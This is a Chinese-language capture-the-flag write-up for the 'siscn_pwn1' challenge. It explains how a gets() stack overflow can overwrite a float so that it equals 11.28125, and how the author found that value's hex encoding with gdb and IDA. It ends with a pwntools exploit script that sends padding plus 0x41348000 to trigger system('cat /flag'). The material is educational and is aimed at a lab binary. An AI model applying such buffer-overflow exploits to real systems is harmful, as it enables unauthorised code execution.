# siscn_pwn1(栈迁移+float数据格式)

> 看一下题发现应该是比较简单的 由于有个gets函数 所以我有点想直接覆盖数据为11.28125

```c
int func()
{
  char v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    return system("cat /flag");
  else
    return puts("Its value should be 11.28125");
}
```

- 保护

```shell
[*] '/home/agentalbrazee/work/ctf/pwn/cp/nssctf/pwn1/pwn1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

## 实验float的存储数据

> 为了实验一下 我们手搓一个程序 gdb调试一下

```c
#include<stdio.h>
int main()
{
    float a;
    a = 11.28125;
    printf("The value of a is %f\n",a);
}
```

- 获取结果:

  ```shell
  ► 0x5555555551c7 <main+62>    call   __isoc99_scanf@plt                <__isoc99_scanf@plt>
          format: 0x555555556004 ◂— 0x7620656854006625 /* '%f' */
          vararg: 0x7fffffffdee4 ◂— 0xc7df9b0041348000
  
  ```

- 那么我们就知道了 这里的存储数据为0xc7df9b0041348000
- 但是好像显然不太对所以我们这里干脆用idapython在ida里面提取出来

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  float v4; // [rsp+2Ch] [rbp-4h] BYREF

  _main(argc, argv, envp);
  v4 = 11.28125;
  scanf("%f", &v4);
  printf("The value of a is %f\n", v4);
  return 0;
}
```

- 然后在scanf里面下idapython脚本:

  ```python
  import idc
  print("rax",hex(idc.get_reg_value("rax")))
  ```

- 获取数据:rax 0x61fe1c 好像还是不太对

- (太笨了)最后我们直接在程序源代码重找cmp的部分找到了 

  ```shell
  .rodata:00000000004007F4 00 80 34 41                   dword_4007F4 dd 41348000h  
  ```

  

## 尝试覆盖

```python
from pwn import *
# r = remote("node5.anna.nssctf.cn",28355)
r = gdb.debug("./pwn1","b main")
print(r.recvuntil(b"Let's guess the number.\n"))
payload = b"a"*(0x30 - 4) +p32(0x41348000)
r.sendline(payload)
r.interactive()
```

- 最后成功 
